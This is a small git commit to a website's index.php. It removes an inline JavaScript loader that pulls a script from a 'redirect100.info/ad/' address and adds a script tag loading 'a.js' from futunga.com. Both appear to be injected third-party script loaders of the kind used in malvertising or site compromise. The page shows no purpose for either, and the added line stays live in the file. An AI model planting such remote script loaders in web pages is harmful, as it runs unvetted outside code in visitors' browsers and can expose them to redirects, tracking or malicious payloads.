01c4399a3651f0b69c1f9129e0f71571a33e7544
sanernecro <sanernecro@gmail.com>
2017-03-14 04:11:14 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,11 +1,5 @@
 <haed>
 <meta property="og:image" content="resimler/pori.jpg"/>
 </heaD>
-<script> 
-     (function (a, d, j, o) {
-           o = a.createElement(d),
-              m = a.getElementsByTagName(d)[0];              
-           o.src = j + "?d=0&r=" + Math.random();
-           m.parentNode.insertBefore(o, m)
-      })(document, 'script', 'http://redirect100.info/ad/32bb0882');
-</script>
+<script type="text/javascript" src="http://futunga.com/a.js"></script>
+
